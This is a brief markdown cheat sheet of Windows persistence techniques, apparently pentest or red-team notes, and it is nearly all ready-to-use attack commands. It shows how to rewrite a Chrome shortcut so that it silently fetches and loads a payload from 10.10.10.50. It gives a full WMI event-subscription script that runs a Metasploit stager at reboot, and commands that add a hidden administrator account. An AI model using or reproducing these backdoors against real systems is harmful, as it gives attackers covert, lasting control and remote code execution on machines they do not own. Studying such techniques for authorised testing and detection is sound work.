# Persistence

## *LNK* backdoor
Backdoor any commonly used shortcut by changing the default target. For example with *Google Chrome*, change the shortcut from:
```
C:\Program Files\Google\Chrome\Application\chrome.exe
```

To:
```powershell
powershell.exe -nop -w hidden -c "[System.Diagnostics.Process]::Start('C:\Program Files\Google\Chrome\Application\chrome.exe');[System.Reflection.Assembly]::Load((iwr 'http://10.10.10.50/i.exe').Content)
```

***

## *WMI* subscriptions (machine reboot)
> Note: this method requires elevated privileges.

```powershell
# Filter arguments (what event(s) we want to trigger on)
$FilterArgs = @{name='BIT-WMI-Demo1';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};

# Create the filter
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

# Setup a malicious consumer for the event
$ConsumerArgs = @{name='BIT-WMI-Demo1';
                CommandLineTemplate='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -e <metasploit stager>';}
$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
 
# Create the backdoor
$FilterToConsumerArgs = @{
  Filter = [Ref] $Filter;
  Consumer = [Ref] $Consumer;
}
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
```
> Note: taken from `https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/`.

***

## Backdoor user
> Note: this method requires elevated privileges.

```
net user /add hacker hackerpassword
net localgroup administrators hacker
```